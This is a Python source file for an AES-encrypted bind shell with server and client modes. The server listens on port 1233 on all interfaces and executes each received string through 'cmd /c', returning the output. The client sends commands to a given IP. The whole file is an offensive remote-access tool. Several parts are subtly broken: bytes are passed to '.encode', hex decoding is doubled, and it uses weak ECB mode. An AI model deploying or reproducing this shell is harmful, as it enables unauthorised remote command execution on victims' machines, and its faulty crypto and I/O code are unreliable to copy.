import socket, subprocess, threading, argparse
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Util.Padding import pad, unpad

DEFAULT_PORT = 1233
MAX_BUFFER = 4096

class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size))

    def decrypt(self, encrypted):
        try:
            return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)
        except ValueError:
            print("[ERROR] Decryption failed! Wrong key?")
            return b""

    def __str__(self):
        return "Key -> {}".format(self.key.hex())
    
def encrypted_send(s, msg):
    s.send(cipher.encrypt(msg).encode("latin-1"))

def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd))
    except:
        output = b"Command failed!"
    return output

def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(s):
    print("[DEBUG] Starting shell thread1")
    encrypted_send(s, b"[ -- Connected! --]")

    try:
        while True:
            encrypted_send(s, b"\r\nEnter Command> ")

            data = s.recv(MAX_BUFFER)
            if data:
                buffer = decode_and_strip(data)

                if not buffer or buffer == "exit":
                    s.close()
                    exit()

                print("> Executing command: '{}'".format(buffer))
                encrypted_send(s, execute_cmd(buffer))

    except:
        s.close()
        exit()

def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            encrypted_send(s, data.encode("latin-1"))
    except:
        s.close()
        exit()

def recv_thread(s):
    try:
        while True:
            raw_data = s.recv(MAX_BUFFER).strip()  # Decode bytes to string
            if raw_data:
                print(f"[DEBUG] Received raw data: {raw_data}")  # Debugging

                decrypted_data = cipher.decrypt(bytes.fromhex(raw_data)).decode("latin-1")
                print(f"[DEBUG] Decrypted data: {decrypted_data}")  # Debugging
                print(decrypted_data, end="", flush=True)
    except Exception as e:
        print(f"[ERROR] Receiving error: {e}")
        s.close()
        exit()

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()

    print("[ -- Starting bind shell! -- ]")
    while True:
        client_socket, addr = s.accept()
        print("[ -- New user connected! -- ]")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()

def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print("[ -- Connecting to bind shell! -- ]")
    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()

parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true", help="Start a bind shell listener")
parser.add_argument("-c", "--connect", help="Connect to a bind shell")
parser.add_argument("-k", "--key", help="Encryption key", type=str, required=False)

args = parser.parse_args()

if args.connect and not args.key:
    parser.error("-c CONNECT requires -k KEY!")

if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher()

print(cipher)

if args.listen:
    server()
elif args.connect:
    client(args.connect)
